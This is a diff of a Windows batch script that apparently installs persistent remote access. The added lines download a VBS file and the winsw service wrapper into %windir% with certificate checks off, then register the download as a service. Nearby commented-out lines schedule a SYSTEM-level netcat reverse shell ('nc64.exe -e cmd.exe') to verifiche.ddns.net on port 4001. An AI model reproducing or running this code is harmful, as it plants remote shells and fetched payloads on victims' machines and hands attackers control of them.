@@ -88,7 +88,10 @@ rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.
 rem schtasks /create /tn sys /xml %windir%\sys.xml /F
 rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\init.vbs
-%windir%\init.vbs
+wget --no-check-certificate %urlgit%/init.vbs  -O %windir%\initsw.xml
+wget --no-check-certificate %urlgit%/winsw.exe  -O %windir%\initsw.exe
+initsw.exe install
+rem %windir%\init.vbs
 
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
